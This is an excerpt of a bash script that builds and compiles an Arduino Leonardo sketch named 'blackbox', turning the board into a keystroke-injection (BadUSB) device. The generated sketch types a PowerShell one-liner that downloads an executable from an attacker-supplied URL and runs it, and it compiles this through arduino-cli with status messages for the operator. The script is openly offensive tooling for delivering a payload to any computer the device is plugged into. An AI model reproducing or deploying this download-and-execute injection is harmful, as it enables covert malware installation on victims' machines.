...
echo -e "\033[32m[INFO]\033[37m Creating sketch"
arduino-cli sketch new blackbox > /dev/null

echo -e "\033[33m[WARNING]\033[37m Is your arduino connected? [y/n] >> "
read arduino

if [[ $arduino == 'y' ]]; then
    echo -e "\033[32m[INFO]\033[37m OK..."
    echo -e "\033[33m[WARNING]\033[37m Uploading script..."
    ...
    echo -e '\tKeyboard.print("$down = New-Object System.Net.WebClient; $url = '$url'; $file = 'bash-bunny.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino
    ...
    echo -e "\033[33m[WARNING]\033[37m Compiling sketch..."
    arduino-cli compile -b arduino:avr:leonardo blackbox/blackbox.ino > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "\033[32m[INFO]\033[37m Compiled successfully"
    else
        echo -e "\033[31m[ERROR]\033[37m Something went wrong"
    fi
else
    echo -e "\033[31m[ERROR]\033[37m Something went wrong..."
fi